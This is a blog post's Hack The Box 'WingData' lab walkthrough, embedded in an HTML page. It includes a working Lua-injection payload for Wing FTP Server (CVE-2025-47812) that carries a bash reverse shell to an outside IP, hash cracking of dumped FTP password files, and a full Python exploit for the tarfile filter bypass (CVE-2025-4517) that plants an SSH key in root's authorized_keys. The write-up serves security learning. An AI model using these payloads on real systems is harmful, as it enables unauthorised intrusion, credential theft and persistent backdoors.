@@ -1,0 +1,975 @@
+<!DOCTYPE html><html lang="en-in"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Hackthebox Wingdata Walkthrough - h4ck3rfirst</title><meta name="robots" content="noindex,nofollow"><meta name="generator" content="Publii Open-Source CMS for Static Site"><meta property="og:title" content="Hackthebox Wingdata Walkthrough"><meta property="og:image" content="https://h4ck3rfirst.github.io/media/posts/33/wingdata.jpg"><meta property="og:image:width" content="678"><meta property="og:image:height" content="452"><meta property="og:site_name" content="h4ck3rfirst"><meta property="og:description" content="WingData Writeup (HackTheBox Easy Machine) is an easy Linux machine from Hack The Box that involves exploiting an unauthenticated RCE&amp;hellip;"><meta property="og:url" content="https://h4ck3rfirst.github.io/wingdata/"><meta property="og:type" content="article"><link rel="stylesheet" href="https://h4ck3rfirst.github.io/assets/css/style.css?v&#x3D;1caf1a6f5543014e342e13c53b1080b8"><script type="application/ld+json">{"@context":"http://schema.org","@type":"Article","mainEntityOfPage":{"@type":"WebPage","@id":"https://h4ck3rfirst.github.io/wingdata/"},"headline":"Hackthebox Wingdata Walkthrough","datePublished":"2026-01-15T21:34+05:30","dateModified":"2026-09-30T21:59+05:30","image":{"@type":"ImageObject","url":"https://h4ck3rfirst.github.io/media/posts/33/wingdata.jpg","height":452,"width":678},"description":"WingData Writeup (HackTheBox Easy Machine) is an easy Linux machine from Hack The Box that involves exploiting an unauthenticated RCE&hellip;","author":{"@type":"Person","name":"h4ck3rfirst","url":"https://h4ck3rfirst.github.io/authors/h4ck3rfirst/"},"publisher":{"@type":"Organization","name":"h4ck3rfirst","logo":{"@type":"ImageObject","url":"https://h4ck3rfirst.github.io/media/website/profile-2.png","height":300,"width":300}}}</script><noscript><style>img[loading] {
+                    opacity: 1;
+                }</style></noscript><style>@media (max-width: 600px) {
+    #publii-space-dust {
+        opacity: 0.85;
+    }
+}</style></head><body class="post-template"><div id="publii-space-dust" aria-hidden="true"><div id="publii-space-mouse-glow"></div></div><header class="top js-header"><a class="logo" href="https://h4ck3rfirst.github.io/"><img src="https://h4ck3rfirst.github.io/media/website/profile-2.png" alt="h4ck3rfirst" width="300" height="300"></a><nav class="navbar js-navbar"><button class="navbar__toggle js-toggle" aria-label="Menu" aria-haspopup="true" aria-expanded="false"><span class="navbar__toggle-box"><span class="navbar__toggle-inner">Menu</span></span></button><ul class="navbar__menu"><li><a href="https://h4ck3rfirst.github.io/" target="_self" rel="https://h4ck3rfirst.github.io/">Home</a></li><li><a href="https://h4ck3rfirst.github.io/tags/ctf-writeups/" target="_self">CTF/Labs</a></li><li><a href="https://h4ck3rfirst.github.io/tags/linux/" target="_self">Linux</a></li><li><a href="https://h4ck3rfirst.github.io/tags/windows/" target="_self">Windows</a></li><li><a href="https://h4ck3rfirst.github.io/tags/learning/" target="_self">Learning</a></li><li><a href="https://h4ck3rfirst.github.io/about-me/" target="_self">About me</a></li></ul></nav></header><main class="post"><article class="content"><div class="hero"><header class="hero__content"><div class="wrapper"><h1>Hackthebox Wingdata Walkthrough</h1><div class="feed__meta content__meta"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" class="feed__author">h4ck3rfirst</a> <time datetime="2026-01-15T21:34" class="feed__date">January 15, 2026</time></div></div></header><figure class="hero__image"><div class="hero__image-wrapper"><img src="https://h4ck3rfirst.github.io/media/posts/33/wingdata.jpg" srcset="https://h4ck3rfirst.github.io/media/posts/33/responsive/wingdata-xs.jpg 640w, https://h4ck3rfirst.github.io/media/posts/33/responsive/wingdata-sm.jpg 768w, https://h4ck3rfirst.github.io/media/posts/33/responsive/wingdata-md.jpg 1024w, https://h4ck3rfirst.github.io/media/posts/33/responsive/wingdata-lg.jpg 1366w, https://h4ck3rfirst.github.io/media/posts/33/responsive/wingdata-xl.jpg 1600w, https://h4ck3rfirst.github.io/media/posts/33/responsive/wingdata-2xl.jpg 1920w" sizes="88vw" loading="eager" height="452" width="678" alt=""></div></figure></div><div class="entry-wrapper content__entry"><p>WingData Writeup (HackTheBox Easy Machine) is an easy Linux machine from Hack The Box that involves exploiting an unauthenticated RCE via null-byte injection, cracking a salted SHA-256 hash for lateral movement, and escalating privileges using a path-traversal flaw in a Python backup script</p><p>• <strong>Reconnaissance:</strong> Scanning open ports reveals SSH (port 22) and HTTP (port 80) running Apache on Debian. • <strong>Web Enumeration:</strong> Discovering the ftp.wingdata.htb subdomain leads to the login page for Wing FTP Server v7.4.3. • <strong>Initial Access (CVE-2025-47812)</strong>: Exploiting an unauthenticated remote code execution vulnerability via null-byte injection in the authentication/session mechanism to gain a shell as the wingftp user. • <strong>Credential Discovery &amp; Cracking</strong>: Locating salted SHA-256 password hashes inside /opt/wftpserver/Data/1/users/wacky.xml and cracking them with hashcat (mode 1410) using the default salt WingFTP to obtain the plaintext password for user wacky. • <strong>Lateral Movement</strong>: Logging in via SSH as wacky to read user.txt. • <strong>Privilege Escalation (CVE-2025-4517)</strong>: Abusing sudo -l permissions which allow running a Python backup-restore script (restore_back_clients.py) as root, leveraging a path-validation bypass/symlink trick in Python’s tarfile module to overwrite critical system files or write into /root for a full root shel</p><h3 id="nmap">Nmap</h3><p><code>nmap</code> finds two open TCP ports, SSH (22) and HTTP (80):</p><pre><code>└─$ nmap -v -p- 10.129.244.106      
+
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+┌──(h4ck3rfirst㉿kali)-[~/shared/hackthebox]
+└─$ nmap -sCV -p22,80 10.129.244.106 
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
+| ssh-hostkey: 
+|   256 a1:fa:95:8b:d7:56:03:85:e4:45:c9:c7:1e:ba:28:3b (ECDSA)
+|_  256 9c:ba:21:1a:97:2f:3a:64:73:c1:4c:1d:ce:65:7a:2f (ED25519)
+80/tcp open  http    Apache httpd 2.4.66
+|_http-server-header: Apache/2.4.66 (Debian)
+|_http-title: Did not follow redirect to http://wingdata.htb/
+Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+┌──(h4ck3rfirst㉿kali)-[~/shared/hackthebox]
+└─$ nmap -sCV -p80 wingdata.htb  
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.66
+|_http-server-header: Apache/2.4.66 (Debian)
+|_http-title: WingData Solutions
+Service Info: Host: localhost
+</code></pre><ul><li><p>Based on Nmap output the OpenSSH 9.2p1 at 22 , the host is likely running Debian. Both of the ports show a TTL of 63, which matches the for Linux one hop away.</p></li><li><p><code>nmap</code> shows a redirect to <code>wingdata.htb</code> on port 80</p></li></ul><h3 id="subdomain-fuzz">Subdomain Fuzz</h3><h3 id="http_80">Http_80</h3><h4 id="main-page">main page</h4><ul><li>Static page</li><li>links lead to anchor points on the page, except “Client Portal</li></ul><pre><code>&lt;li&gt;&lt;div class=&quot;main-red-button&quot;&gt;&lt;a href=&quot;[http://ftp.wingdata.htb/](view-source:http://ftp.wingdata.htb/)&quot;&gt;Client Portal&lt;/a&gt;&lt;/div&gt;&lt;/li&gt;
+</code></pre><ul><li>Subdomain <code>http://ftp.wingdata.htb/</code></li></ul><h4 id="subdomain">Subdomain</h4><p>I’ll use <code>ffuf</code> to bruteforce for subdomains</p><pre><code>└─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u &#39;http://wingdata.htb&#39; -H &quot;Host: FUZZ.wingdata.htb&quot;  -ic -c -ac
+________________________________________________
+
+ftp                     [Status: 200, Size: 678, Words: 44, Lines: 10, Duration: 117ms]
+</code></pre><p>It finds <code>ftp.wingdata.htb</code>. I’ll add both to my local <code>hosts</code> file:</p><h5 id="httpftpwingdatahtb"><a href="http://ftp.wingdata.htb/">http://ftp.wingdata.htb/</a></h5><p>The version is given in the site footer as v7.4.3. A vulnerability has been found in Wing FTP Server 7.4.3. it is affected <a href="https://medium.com/@defencerabbit/cve-2025-47812-wing-ftp-remote-code-execution-99a4400e7488">CVE-2025-47812</a> with injection or command injection attack in login page. Even an anonymous FTP account (if enabled) can be used to <a href="https://raw.githubusercontent.com/estebanzarate/CVE-2025-47812-Wing-FTP-Server-7.4.3-Unauthenticated-RCE-PoC/refs/heads/main/CVE-2025-47812.py">exploit</a> the flaw.</p><p>A NULL byte <code>%00</code> injected into the <code>username</code> parameter during login causes Lua code to be written into the session file.</p><p>the application creates a new session ID indicated by the UID session cookie:</p><pre><code>username=anonymous%00test 
+</code></pre><p>As the cve</p><pre><code>]]
+local h = io.popen(&quot;id&quot;)
+local r = h:read(&quot;*a&quot;)
+h:close()
+print(r)
+--&amp;password=&amp;username_val=&amp;password_val=
+
+# encode paylaod
+username=anonymous%00]]%0dlocal+h+%3d+io.popen(&quot;id&quot;)%0dlocal+r+%3d+h%3aread(&quot;*a&quot;)%0dh%3aclose()%0dprint(r)%0d--&amp;password=&amp;username_val=&amp;password_val=
+
+response 
+Set-Cookie: UID=c121fa8991de2dab002732cc1a4d1a24f528764d624db129b32c21fbca0cb8d6;
+</code></pre><p>then</p><pre><code>curl -s -X POST -H &#39;Set-Cookie: UID=c121fa8991de2dab002732cc1a4d1a24f528764d624db129b32c21fbca0cb8d6;&#39; http://ftp.wingdata.htb
+uid=1000(wingftp) gid=1000(wingftp) groups=1000(wingftp),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)
+</code></pre><p>injecting a reverse-shell</p><pre><code>username=anonymous%00]]%0dlocal+h+%3d+io.popen(&quot;bash+-c+&#39;bash+-i+&gt;%26+/dev/tcp/10.10.16.109/443+0&gt;%261&#39;&quot;)%0dlocal+r+%3d+h%3aread(&quot;*a&quot;)%0dh%3aclose()%0dprint(r)%0d--&amp;password=&amp;username_val=&amp;password_val=
+</code></pre><h3 id="intial-access">Intial Access</h3><p>at</p><pre><code> nc -lnvp 443
+Listening on 0.0.0.0 443
+Connection received on 10.129.244.106 48212
+bash: cannot set terminal process group (3560): Inappropriate ioctl for device
+bash: no job control in this shell
+wingftp@wingdata:/opt/wftpserver$ 
+</code></pre><p>WingFTP uses a file-based storage system instead of a database, which is in the <code>Data</code> directory. <code>_ADMINISTRATOR</code> has a file with config data on the admin users:</p><pre><code>wingftp@wingdata:/opt/wftpserver/Data$ ls 1 
+groups  portlistener.xml  settings.xml  users
+wingftp@wingdata:/opt/wftpserver/Data$ ls 1/users/
+anonymous.xml  john.xml  maria.xml  steve.xml  wacky.xml
+</code></pre><pre><code>wingftp@wingdata:/opt/wftpserver$ grep --color=auto -rnw &#39;.&#39; -ie &quot;password&quot; --color=always 2&gt; /dev/null
+&lt;-rnw &#39;.&#39; -ie &quot;password&quot; --color=always 2&gt; /dev/null
+./Data/_ADMINISTRATOR/admins.xml:5:        &lt;Password&gt;a8339f8e4465a9c47158394d8efe7cc45a5f361ab983844c8562bef2193bafba&lt;/Password&gt;
+./Data/1/users/maria.xml:7:        &lt;Password&gt;a70221f33a51dca76dfd46c17ab17116a97823caf40aeecfbc611cae47421b03&lt;/Password&gt;
+./Data/1/users/steve.xml:7:        &lt;Password&gt;5916c7481fa2f20bd86f4bdb900f0342359ec19a77b7e3ae118f3b5d0d3334ca&lt;/Password&gt;
+./Data/1/users/wacky.xml:7:        &lt;Password&gt;32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca&lt;/Password&gt;
+./Data/1/users/anonymous.xml:7:        &lt;Password&gt;d67f86152e5c4df1b0ac4a18d3ca4a89c1b12e6b748ed71d01aeb92341927bca&lt;/Password&gt;
+./Data/1/users/john.xml:7:        &lt;Password&gt;c1f14672feec3bba27231048271fcdcddeb9d75ef79f6889139aa78c9d398f10&lt;/Password&gt;
+./version.txt:3:Fixed a security bug 
+</code></pre><p><a href="https://www.wftpserver.com/help/ftpserver/index.html?compression.htm">WingFTP documentation</a> show the passwords are stored as “SHA256(Password+SaltString)”.</p><p>Hashcat has in it’s <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">example hashes page</a> page mode 1410:</p><p>The output above also showed that there is a salt of “WingFTP”.</p><h4 id="crecking">crecking</h4><pre><code>$ hashcat -m 1410 --user wingftp.hashes /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
+hashcat (v7.1.2) starting
+...[snip]...
+d67f86152e5c4df1b0ac4a18d3ca4a89c1b12e6b748ed71d01aeb92341927bca:WingFTP:
+32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP:!#7Blushing^*Bride5
+...[snip]...
+</code></pre><h2 id="3-privilege-escalation">3. Privilege escalation</h2><pre><code>Username: wacky
+Password: !#7Blushing^*Bride5
+Service: SSH (Port 22)
+</code></pre><h3 id="32-initial-connection">3.2 Initial Connection</h3><pre><code class="language-bash">ssh wacky@wingdata.htb
+</code></pre><p><strong>Result</strong>: Successful authentication as user <code>wacky</code> (UID 1001, GID 1001)</p><h3 id="33-initial-user-context">3.3 Initial User Context</h3><pre><code>wacky@wingdata:~$ id
+uid=1001(wacky) gid=1001(wacky) groups=1001(wacky)
+
+wacky@wingdata:~$ pwd
+/home/wacky
+
+wacky@wingdata:~$ ls -la
+total 24
+drwxr-x--- 2 wacky wacky 4096 Feb 15 00:50 .
+drwxr-xr-x 3 root  root  4096 Nov  2 11:12 ..
+-rw------- 1 wacky wacky    0 Feb 15 00:50 .bash_history
+-rw-r--r-- 1 wacky wacky  220 Nov  2 11:12 .bash_logout
+-rw-r--r-- 1 wacky wacky 3526 Nov  2 11:12 .bashrc
+-rw-r--r-- 1 wacky wacky  807 Nov  2 11:12 .profile
+-rw-r----- 1 root  wacky   33 Feb 14 20:06 user.txt
+</code></pre><p><strong>User flag obtained</strong>: <code>e*********************************e</code></p><hr><h3 id="4-vulnerability-analysis">4. Vulnerability Analysis</h3><h4 id="41-sudo-privileges-enumeration">4.1 Sudo Privileges Enumeration</h4><p>The first critical discovery was made using <code>sudo -l</code>:</p><pre><code class="language-bash">wacky@wingdata:~$ sudo -l
+Matching Defaults entries for wacky on wingdata:
+    env_reset, mail_badpass, 
+    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin, 
+    use_pty
+
+User wacky may run the following commands on wingdata:
+    (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
+</code></pre><p><strong>Key Finding</strong>: User <code>wacky</code> can execute a Python script as root with any arguments (*) without password authentication.</p><h4 id="42-vulnerable-script-analysis">4.2 Vulnerable Script Analysis</h4><p><strong>Location</strong>: <code>/opt/backup_clients/restore_backup_clients.py</code></p><p><strong>Purpose</strong>: Restore client configuration from backup tarball archives</p><p><strong>Key Code Sections</strong>:</p><pre><code class="language-python">#!/usr/bin/env python3
+import tarfile
+import os
+import sys
+import re
+import argparse
+
+BACKUP_BASE_DIR = &quot;/opt/backup_clients/backups&quot;
+STAGING_BASE = &quot;/opt/backup_clients/restored_backups&quot;
+
+def validate_backup_name(filename):
+    if not re.fullmatch(r&quot;^backup_\d+\.tar$&quot;, filename):
+        return False
+    client_id = filename.split(&#39;_&#39;)[1].rstrip(&#39;.tar&#39;)
+    return client_id.isdigit() and client_id != &quot;0&quot;
+
+def validate_restore_tag(tag):
+    return bool(re.fullmatch(r&quot;^[a-zA-Z0-9_]{1,24}$&quot;, tag))
+
+# ... argument parsing ...
+
+# CRITICAL SECTION - VULNERABLE EXTRACTION
+try:
+    with tarfile.open(backup_path, &quot;r&quot;) as tar:
+        tar.extractall(path=staging_dir, filter=&quot;data&quot;)
+    print(f&quot;[+] Extraction completed in {staging_dir}&quot;)
+except (tarfile.TarError, OSError, Exception) as e:
+    print(f&quot;[!] Error during extraction: {e}&quot;, file=sys.stderr)
+    sys.exit(2)
+</code></pre><h3 id="43-security-controls-analysis">4.3 Security Controls Analysis</h3><p><strong>Implemented Controls</strong>:</p><ol><li>Filename validation (must match <code>backup_&lt;digits&gt;.tar</code>)</li><li>Restore directory validation (must match <code>restore_&lt;alphanumeric&gt;</code>)</li><li>Fixed base directories (no path traversal in arguments)</li><li>Use of <code>filter=&quot;data&quot;</code> (supposedly safe extraction filter)</li></ol><p><strong>Weakness Identified</strong>: Despite using the “data” filter, the script is vulnerable to <strong>CVE-2025-4517</strong>, which bypasses the filter’s path validation through PATH_MAX overflow exploitation.</p><h3 id="44-cve-2025-4517-vulnerability-details">4.4 CVE-2025-4517 Vulnerability Details</h3><p><strong>CVE ID</strong>: CVE-2025-4517<br><strong>Component</strong>: Python <code>tarfile</code> module (versions prior to patch)<br><strong>Affected Python Version on Target</strong>: Python 3.12.3<br><strong>CVSS Score</strong>: 9.8 (Critical)<br><strong>Vulnerability Type</strong>: Path Traversal / Arbitrary File Write</p><p><strong>Root Cause</strong>: The tarfile “data” filter relies on <code>os.path.realpath()</code> to canonicalize paths and validate they don’t escape the extraction directory. However, when symlink resolution produces paths exceeding PATH_MAX (4096 bytes on Linux), <code>realpath()</code> fails to fully canonicalize the path but does not raise an error. This causes:</p><ol><li>The filter receives an incomplete/truncated canonical path</li><li>The security check passes incorrectly</li><li>During extraction, the filesystem follows the actual symlink chain</li><li>Files can be written outside the intended extraction directory</li></ol><p><strong>Attack Vector</strong>: By crafting a tar archive with deeply nested symlinks that expand beyond PATH_MAX during resolution, an attacker can bypass the “data” filter and achieve arbitrary file write as the user running the extraction (in this case, root via sudo).</p><hr><h2 id="5-exploitation-process">5. Exploitation Process</h2><h3 id="51-attack-chain-overview">5.1 Attack Chain Overview</h3><pre><code>1. Generate SSH Key Pair
+   ↓
+2. Create Malicious Tar Archive (CVE-2025-4517 PoC)
+   ↓
+3. Upload Tar to Target (/tmp/)
+   ↓
+4. Move Tar to Backup Directory
+   ↓
+5. Trigger Sudo Script with Malicious Tar
+   ↓
+6. Exploit Writes SSH Key to /root/.ssh/authorized_keys
+   ↓
+7. SSH as Root with Private Key
+   ↓
+8. Retrieve Root Flag
+</code></pre><h3 id="52-step-by-step-exploitation">5.2 Step-by-Step Exploitation</h3><h4 id="step-1-ssh-key-generation">Step 1: SSH Key Generation</h4><p><strong>Command</strong>:</p><pre><code class="language-bash">ssh-keygen -t ed25519 -f root_key -N &quot;&quot;
+</code></pre><p><strong>Output</strong>:</p><pre><code>Generating public/private ed25519 key pair.
+Your identification has been saved in root_key
+Your public key has been saved in root_key.pub
+</code></pre><p><strong>Generated Public Key</strong>:</p><pre><code>ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIM1GIgGyiyAmfAgWTDpfM02fuwKV2DNEqQxvAHVd4Y2p root@kali
+</code></pre><h4 id="step-2-malicious-tar-creation">Step 2: Malicious Tar Creation</h4><p><strong>Script</strong>: <code>create_exploit.py</code></p><pre><code class="language-python">import tarfile
+import os
+import io
+
+# Configuration
+EVIL_TAR_NAME = &quot;backup_1337.tar&quot;
+TRAVERSAL_PATH = &quot;/../../../../root/.ssh/authorized_keys&quot;
+WRITE_CONTENT = &quot;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIM1GIgGyiyAmfAgWTDpfM02fuwKV2DNEqQxvAHVd4Y2p root@kali&quot;
+
+# Create deeply nested directory structure
+comp = &#39;d&#39; * 247  # Long directory name (247 chars)
+steps = &quot;abcdefghijklmnop&quot;  # 16 levels deep
+path = &quot;&quot;
+
+with tarfile.open(EVIL_TAR_NAME, mode=&quot;x&quot;) as tar:
+    # Build 16-level symlink chain
+    for i in steps:
+        # Create long directory
+        a = tarfile.TarInfo(os.path.join(path, comp))
+        a.type = tarfile.DIRTYPE
+        tar.addfile(a)
+        
+        # Create short symlink pointing to long directory
+        b = tarfile.TarInfo(os.path.join(path, i))
+        b.type = tarfile.SYMTYPE
+        b.linkname = comp
+        tar.addfile(b)
+        
+        path = os.path.join(path, comp)
+    
+    # Create extremely long symlink that exceeds PATH_MAX
+    linkpath = os.path.join(&quot;/&quot;.join(steps), &quot;l&quot;*254)
+    l = tarfile.TarInfo(linkpath)
+    l.type = tarfile.SYMTYPE
+    l.linkname = (&quot;../&quot; * len(steps))
+    tar.addfile(l)
+    
+    # Create escape symlink pointing outside extraction directory
+    e = tarfile.TarInfo(&quot;escape&quot;)
+    e.type = tarfile.SYMTYPE
+    e.linkname = linkpath + TRAVERSAL_PATH
+    tar.addfile(e)
+    
+    # Create hardlink to the escape target
+    f = tarfile.TarInfo(&quot;flaglink&quot;)
+    f.type = tarfile.LNKTYPE
+    f.linkname = &quot;escape&quot;
+    tar.addfile(f)
+    
+    # Write SSH public key payload
+    content = WRITE_CONTENT.encode() + b&quot;\n&quot;
+    c = tarfile.TarInfo(&quot;flaglink&quot;)
+    c.type = tarfile.REGTYPE
+    c.size = len(content)
+    tar.addfile(c, fileobj=io.BytesIO(content))
+
+print(&quot;[+] Created malicious tar: backup_1337.tar&quot;)
+</code></pre><p><strong>Execution</strong>:</p><pre><code class="language-bash">python3 create_exploit.py
+</code></pre><p><strong>Result</strong>: <code>backup_1337.tar</code> created (112,640 bytes)</p><p><strong>Tar Archive Structure</strong>:</p><pre><code>backup_1337.tar
+├── ddddd...ddddd/ (247 chars, repeated 16 levels)
+├── a -&gt; ddddd...ddddd
+├── b -&gt; ddddd...ddddd
+├── c -&gt; ddddd...ddddd
+├── ...
+├── p -&gt; ddddd...ddddd
+├── a/b/c/.../p/llllll...(254 chars) -&gt; ../../../../../../../../../../../../../../../../
+├── escape -&gt; &lt;long-path&gt;/../../../../../root/.ssh/authorized_keys
+├── flaglink (hardlink to escape)
+└── flaglink (regular file with SSH key content)
+</code></pre><p><strong>Why This Works</strong>:</p><ol><li>The symlink chain <code>a/b/c/.../p/lll...</code> expands to &gt; 4096 bytes when resolved</li><li><code>os.path.realpath()</code> cannot fully canonicalize it (PATH_MAX limit)</li><li>The “data” filter sees an incomplete path and incorrectly validates it as safe</li><li>During extraction, the filesystem follows the real symlink chain</li><li><code>escape</code> resolves to <code>/root/.ssh/authorized_keys</code></li><li>The hardlink <code>flaglink</code> points to this external file</li><li>Writing to <code>flaglink</code> actually writes to root’s authorized_keys file</li></ol><h4 id="step-3-upload-tar-to-target">Step 3: Upload Tar to Target</h4><p><strong>Command</strong>:</p><pre><code class="language-bash">sshpass -p &#39;!#7Blushing^*Bride5&#39; scp -o StrictHostKeyChecking=no \
+    backup_1337.tar wacky@wingdata.htb:/tmp/
+</code></pre><p><strong>Result</strong>: File uploaded successfully</p><h4 id="step-4-move-to-backup-directory">Step 4: Move to Backup Directory</h4><p><strong>Command</strong>:</p><pre><code class="language-bash">sshpass -p &#39;!#7Blushing^*Bride5&#39; ssh wacky@wingdata.htb \
+    &quot;cp /tmp/backup_1337.tar /opt/backup_clients/backups/&quot;
+</code></pre><p><strong>Result</strong>: Tar moved to <code>/opt/backup_clients/backups/backup_1337.tar</code></p><p><strong>Why This Works</strong>:</p><ul><li>User <code>wacky</code> has write access to <code>/opt/backup_clients/backups/</code></li><li>The script only reads from this directory, so we can place our malicious archive there</li></ul><h4 id="step-5-trigger-exploitation">Step 5: Trigger Exploitation</h4><p><strong>Command</strong>:</p><pre><code class="language-bash">sshpass -p &#39;!#7Blushing^*Bride5&#39; ssh wacky@wingdata.htb \
+    &quot;sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py \
+     -b backup_1337.tar -r restore_exploit&quot;
+</code></pre><p><strong>Output</strong>:</p><pre><code>[+] Backup: backup_1337.tar
+[+] Staging directory: /opt/backup_clients/restored_backups/restore_exploit
+[+] Extraction completed in /opt/backup_clients/restored_backups/restore_exploit
+</code></pre><p><strong>What Happened</strong>:</p><ol><li>Script validated filename: <code>backup_1337.tar</code> ✓ (matches <code>backup_\d+\.tar</code>)</li><li>Script validated restore dir: <code>restore_exploit</code> ✓ (matches <code>restore_[a-zA-Z0-9_]+</code>)</li><li>Script opened tar as root (via sudo)</li><li>Script called <code>tar.extractall(path=staging_dir, filter=&quot;data&quot;)</code></li><li><strong>CVE-2025-4517 triggered</strong>: Filter bypassed due to PATH_MAX overflow</li><li>Hardlink <code>flaglink</code> resolved to <code>/root/.ssh/authorized_keys</code></li><li>SSH public key written to root’s authorized_keys file</li><li>Extraction completed successfully with no errors</li></ol><h4 id="step-6-ssh-as-root">Step 6: SSH as Root</h4><p><strong>Command</strong>:</p><pre><code class="language-bash">chmod 600 root_key
+ssh -i root_key -o StrictHostKeyChecking=no root@wingdata.htb
+</code></pre><p><strong>Result</strong>:</p><pre><code>root@wingdata:~# id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre><p><strong>Authentication Method</strong>: Public key authentication using injected SSH key</p><h4 id="step-7-root-flag-retrieval">Step 7: Root Flag Retrieval</h4><p><strong>Command</strong>:</p><pre><code class="language-bash">cat /root/root.txt
+</code></pre><p><strong>Root Flag</strong>: <code>5df871f9bc04066e5a415192d28943d8</code></p><h3 id="53-verification-of-exploit-success">5.3 Verification of Exploit Success</h3><p><strong>Post-Exploitation Verification</strong>:</p><pre><code class="language-bash">root@wingdata:~# cat /root/.ssh/authorized_keys
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIM1GIgGyiyAmfAgWTDpfM02fuwKV2DNEqQxvAHVd4Y2p root@kali
+
+root@wingdata:~# ls -la /root/
+total 28
+drwx------  4 root root 4096 Feb 15 10:50 .
+drwxr-xr-x 18 root root 4096 Feb  9 08:19 ..
+-rw-------  1 root root    0 Feb 15 10:50 .bash_history
+-rw-r--r--  1 root root  571 Apr 10  2021 .bashrc
+-rw-r--r--  1 root root  161 Jul  9  2019 .profile
+drwxr-xr-x  2 root root 4096 Feb 15 10:49 .ssh
+-rw-r-----  1 root root   33 Feb 14 20:06 root.txt
+
+root@wingdata:~# cat /root/root.txt
+5df871f9bc04066e5a415192d28943d8
+</code></pre><p><strong>Confirmation</strong>: Full root access achieved with persistent backdoor (SSH key)</p><hr><h2 id="6-technical-deep-dive">6. Technical Deep Dive</h2><h3 id="61-cve-2025-4517-exploitation-mechanics">6.1 CVE-2025-4517 Exploitation Mechanics</h3><h4 id="611-path_max-limitation">6.1.1 PATH_MAX Limitation</h4><pre><code class="language-c">#define PATH_MAX 4096  // Maximum path length in Linux
+</code></pre><p>When a path exceeds this limit during symlink resolution, <code>os.path.realpath()</code> behavior becomes undefined/incomplete.</p><h4 id="612-symlink-expansion-calculation">6.1.2 Symlink Expansion Calculation</h4><p><strong>Single Level</strong>:</p><ul><li>Directory name: 247 characters</li><li>Symlink name: 1 character</li><li>When resolved: 247 characters</li></ul><p><strong>16 Levels Deep</strong>:</p><ul><li>Base path: <code>a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/</code></li><li>Each letter resolves to 247 ‘d’ characters</li><li>Total expanded length: 16 × 247 = 3,952 bytes</li></ul><p><strong>Final Long Symlink</strong>:</p><ul><li>Path: <code>a/b/c/.../p/lll...lll</code> (254 ‘l’ characters)</li><li>When fully expanded: 3,952 + 254 = 4,206 bytes</li><li><strong>Result</strong>: Exceeds PATH_MAX by 110 bytes</li></ul><h4 id="613-filter-bypass-mechanism">6.1.3 Filter Bypass Mechanism</h4><p><strong>Normal Operation</strong> (Safe Path):</p><pre><code class="language-python"># Input: &quot;test/file.txt&quot;
+real_path = os.path.realpath(&quot;/opt/backup_clients/restored_backups/restore_exploit/test/file.txt&quot;)
+# Result: &quot;/opt/backup_clients/restored_backups/restore_exploit/test/file.txt&quot;
+
+# Validation check:
+if real_path.startswith(extraction_dir):
+    # SAFE - path is within extraction directory
+    allow_extraction()
+</code></pre><p><strong>Exploited Operation</strong> (CVE-2025-4517):</p><pre><code class="language-python"># Input: &quot;a/b/c/.../p/lll...lll&quot; (&gt; PATH_MAX when resolved)
+real_path = os.path.realpath(&quot;/opt/backup_clients/restored_backups/restore_exploit/a/b/c/.../p/lll...&quot;)
+# Result: INCOMPLETE CANONICALIZATION
+# Returns: &quot;/opt/backup_clients/restored_backups/restore_exploit/a/b/c/...&quot;
+#          (truncated or partially resolved)
+
+# Validation check:
+if real_path.startswith(extraction_dir):
+    # INCORRECTLY PASSES - path appears safe due to incomplete resolution
+    allow_extraction()
+
+# During actual filesystem operations:
+# Kernel fully resolves symlinks according to filesystem rules
+# Final resolution: /root/.ssh/authorized_keys (OUTSIDE extraction directory!)
+</code></pre><h4 id="614-hardlink-abuse">6.1.4 Hardlink Abuse</h4><p><strong>Why Hardlinks Matter</strong>:</p><ul><li>Hardlinks reference the same inode as the target file</li><li>Writing to a hardlink writes to the original file</li><li>Hardlinks bypass typical path-based security checks</li></ul><p><strong>Exploitation Flow</strong>:</p><pre><code>1. Create symlink &quot;escape&quot; -&gt; /root/.ssh/authorized_keys (via long path)
+2. Create hardlink &quot;flaglink&quot; -&gt; &quot;escape&quot;
+3. Write SSH key to &quot;flaglink&quot;
+4. Result: SSH key written to /root/.ssh/authorized_keys
+</code></pre><p><strong>Filesystem Perspective</strong>:</p><pre><code>/opt/backup_clients/restored_backups/restore_exploit/
+├── escape -&gt; /root/.ssh/authorized_keys  (symlink - bypassed filter)
+└── flaglink -&gt; escape                     (hardlink - references same inode)
+
+/root/.ssh/
+└── authorized_keys                        (MODIFIED - SSH key injected)
